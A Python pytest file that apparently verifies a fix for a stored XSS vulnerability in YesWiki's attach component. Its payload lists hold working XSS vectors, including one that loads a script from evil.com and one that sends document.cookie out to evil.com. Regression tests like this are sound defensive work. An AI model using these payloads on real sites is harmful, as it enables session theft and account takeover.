"""
Vulnerability tests for YesWiki attach component XSS issue (CVE-2025-24018).

The vulnerability exists in showFileNotExits() function in tools/attach/libs/attach.lib.php
where $this->file is directly echoed to HTML without sanitization.

The fix is to use htmlspecialchars() which escapes <, >, &, and quotes.

IMPORTANT: Payloads must NOT contain double quotes (") because they are used
in the {{attach file="..."}} syntax and would be truncated by YesWiki parser.

Tests should:
- FAIL when vulnerable (XSS payload renders unescaped)
- PASS when fixed (XSS payload is properly escaped)
"""

import pytest
import requests
import time
import random
import string
import re

BASE_URL = "http://localhost:8085/"
TIMEOUT = 30


# XSS payloads that exploit the lack of htmlspecialchars()
# All payloads contain < or > which should be escaped to &lt; &gt;
# MUST NOT contain double quotes (breaks attach syntax)

SCRIPT_TAG_PAYLOADS = [
    "<script>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script src=//evil.com/x.js></script>",
    "<script>document.location='//evil.com/?c='+document.cookie</script>",
]

EVENT_HANDLER_PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<img src=x onerror=alert(1)//>",
]

ATTRIBUTE_INJECTION_PAYLOADS = [
    "'><script>alert(1)</script>",
    "'/><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
]

SVG_PAYLOADS = [
    "<svg><script>alert(1)</script></svg>",
    "<svg onload=alert(1)>",
    "<svg><animate onbegin=alert(1)>",
    "<svg><set onbegin=alert(1)>",
]

ENCODING_BYPASS_PAYLOADS = [
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<script>alert&#40;1&#41;</script>",
    "<img src=x onerror=alert&#x28;1&#x29;>",
]

IFRAME_PAYLOADS = [
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<object data=javascript:alert(1)>",
]

ADDITIONAL_PAYLOADS = [
    "<img src=1 onerror=alert(1)>",
    "<isindex action=javascript:alert(1)>",
    "<form><button formaction=javascript:alert(1)>X",
]


def wait_for_server():
    """Wait for the server to be ready."""
    session = requests.Session()
    for _ in range(60):
        try:
            resp = session.get(BASE_URL, timeout=5)
            if resp.status_code == 200:
                return session
        except requests.exceptions.RequestException:
            pass
        time.sleep(1)
    raise RuntimeError("Server did not become ready in time")


def random_page_name():
    """Generate a random wiki page name (must be CamelCase for YesWiki)."""
    return "XssTest" + "".join(random.choices(string.ascii_uppercase, k=8))


def login(session):
    """Login as admin user."""
    login_url = f"{BASE_URL}?PagePrincipale"
    login_data = {
        "name": "WikiAdmin",
        "password": "admin123",
        "action": "login",
    }
    response = session.post(login_url, data=login_data, timeout=TIMEOUT)
    return response.status_code == 200


def create_page(session, page_name, payload):
    """
    Create a wiki page via HTTP POST through YesWiki frontend.
    This simulates how a real attacker would inject XSS via the attach action.
    """
    edit_url = f"{BASE_URL}?{page_name}/edit"
    body = f'{{{{attach file="{payload}" desc="test"}}}}'
    edit_data = {
        "body": body,
        "submit": "Sauver",
    }

    response = session.post(edit_url, data=edit_data, timeout=TIMEOUT, allow_redirects=True)
    time.sleep(0.3)

    return response.status_code == 200


def get_page_html(session, page_name):
    """Get the rendered HTML of a wiki page."""
    response = session.get(f"{BASE_URL}?{page_name}", timeout=TIMEOUT)
    return response.text


def is_xss_payload_unescaped(html, payload):
    """
    Check if the XSS payload appears unescaped in HTML.
    The vulnerability is that < and > are not escaped to &lt; &gt;
    Returns (is_vulnerable, reason)
    """
    # Direct payload match - the definitive vulnerability check
    if payload in html:
        return True, f"Raw payload found unescaped in HTML"

    # Check for unescaped script tags containing our attack code
    if re.search(r'<script[^>]*>.*?(?:alert|eval|document)[^<]*</script>', html, re.IGNORECASE | re.DOTALL):
        return True, "Unescaped script tag with dangerous content"

    # Check for unescaped img/svg/etc with event handlers
    dangerous_tags = ['img', 'svg', 'body', 'input', 'video', 'audio', 'details', 'marquee', 'iframe', 'object', 'form', 'button', 'isindex']
    for tag in dangerous_tags:
        pattern = rf'<{tag}[^>]*(?:onerror|onload|onfocus|ontoggle|onstart|onbegin|formaction)[^>]*>'
        if re.search(pattern, html, re.IGNORECASE):
            return True, f"Unescaped <{tag}> with event handler"

    return False, None


class TestScriptTagInjection:
    """Test script tag injection - the core XSS vector."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.session = wait_for_server()
        login(self.session)

    @pytest.mark.parametrize("payload", SCRIPT_TAG_PAYLOADS)
    def test_script_tag_escaped(self, payload):
        """Script tags must be escaped to &lt;script&gt;"""
        page_name = random_page_name()
        assert create_page(self.session, page_name, payload), "Failed to create page"

        html = get_page_html(self.session, page_name)
        is_vuln, reason = is_xss_payload_unescaped(html, payload)

        assert not is_vuln, f"VULNERABLE: {reason}"


class TestEventHandlerInjection:
    """Test event handler injection via HTML tags."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.session = wait_for_server()
        login(self.session)

    @pytest.mark.parametrize("payload", EVENT_HANDLER_PAYLOADS)
    def test_event_handler_escaped(self, payload):
        """Tags with event handlers must be escaped."""
        page_name = random_page_name()
        assert create_page(self.session, page_name, payload), "Failed to create page"

        html = get_page_html(self.session, page_name)
        is_vuln, reason = is_xss_payload_unescaped(html, payload)

        assert not is_vuln, f"VULNERABLE: {reason}"


class TestAttributeInjection:
    """Test HTML tag injection via attribute breakout."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.session = wait_for_server()
        login(self.session)

    @pytest.mark.parametrize("payload", ATTRIBUTE_INJECTION_PAYLOADS)
    def test_attribute_breakout_prevented(self, payload):
        """Angle brackets must be escaped even after quotes."""
        page_name = random_page_name()
        assert create_page(self.session, page_name, payload), "Failed to create page"

        html = get_page_html(self.session, page_name)
        is_vuln, reason = is_xss_payload_unescaped(html, payload)

        assert not is_vuln, f"VULNERABLE: {reason}"


class TestSVGInjection:
    """Test SVG-based XSS vectors."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.session = wait_for_server()
        login(self.session)

    @pytest.mark.parametrize("payload", SVG_PAYLOADS)
    def test_svg_xss_prevented(self, payload):
        """SVG elements must be escaped."""
        page_name = random_page_name()
        assert create_page(self.session, page_name, payload), "Failed to create page"

        html = get_page_html(self.session, page_name)
        is_vuln, reason = is_xss_payload_unescaped(html, payload)

        assert not is_vuln, f"VULNERABLE: {reason}"


class TestEncodingBypass:
    """Test encoding-based bypass attempts."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.session = wait_for_server()
        login(self.session)

    @pytest.mark.parametrize("payload", ENCODING_BYPASS_PAYLOADS)
    def test_encoding_bypass_prevented(self, payload):
        """Encoded payloads with < > must still be escaped."""
        page_name = random_page_name()
        assert create_page(self.session, page_name, payload), "Failed to create page"

        html = get_page_html(self.session, page_name)
        is_vuln, reason = is_xss_payload_unescaped(html, payload)

        assert not is_vuln, f"VULNERABLE: {reason}"


class TestIframeInjection:
    """Test iframe/object tag injection."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.session = wait_for_server()
        login(self.session)

    @pytest.mark.parametrize("payload", IFRAME_PAYLOADS)
    def test_iframe_xss_prevented(self, payload):
        """Iframe/object tags must be escaped."""
        page_name = random_page_name()
        assert create_page(self.session, page_name, payload), "Failed to create page"

        html = get_page_html(self.session, page_name)
        is_vuln, reason = is_xss_payload_unescaped(html, payload)

        assert not is_vuln, f"VULNERABLE: {reason}"


class TestAdditionalVectors:
    """Test additional HTML injection vectors."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.session = wait_for_server()
        login(self.session)

    @pytest.mark.parametrize("payload", ADDITIONAL_PAYLOADS)
    def test_additional_vectors_prevented(self, payload):
        """Additional HTML tags must be escaped."""
        page_name = random_page_name()
        assert create_page(self.session, page_name, payload), "Failed to create page"

        html = get_page_html(self.session, page_name)
        is_vuln, reason = is_xss_payload_unescaped(html, payload)

        assert not is_vuln, f"VULNERABLE: {reason}"


class TestFixValidation:
    """Verify the fix correctly applies htmlspecialchars()."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.session = wait_for_server()
        login(self.session)

    def test_angle_brackets_become_entities(self):
        """< must become &lt; and > must become &gt;"""
        page_name = random_page_name()
        payload = "<script>alert(1)</script>"

        create_page(self.session, page_name, payload)
        html = get_page_html(self.session, page_name)

        # The raw payload should NOT appear
        assert payload not in html, "VULNERABLE: < > not escaped"

    def test_nested_tags_escaped(self):
        """Nested HTML tags must all be escaped."""
        page_name = random_page_name()
        payload = "<div><script>alert(1)</script></div>"

        create_page(self.session, page_name, payload)
        html = get_page_html(self.session, page_name)

        assert payload not in html, "VULNERABLE: Nested tags not escaped"

    def test_mixed_case_tags_escaped(self):
        """Mixed case tags must be escaped."""
        page_name = random_page_name()
        payload = "<ScRiPt>alert(1)</ScRiPt>"

        create_page(self.session, page_name, payload)
        html = get_page_html(self.session, page_name)

        assert payload not in html, "VULNERABLE: Mixed case tags not escaped"

    def test_special_filename_chars_safe(self):
        """Filenames with < > & should be safely escaped."""
        page_name = random_page_name()
        payload = "file<name>&test.txt"

        create_page(self.session, page_name, payload)
        html = get_page_html(self.session, page_name)

        assert "<name>" not in html, "VULNERABLE: < > in filename not escaped"
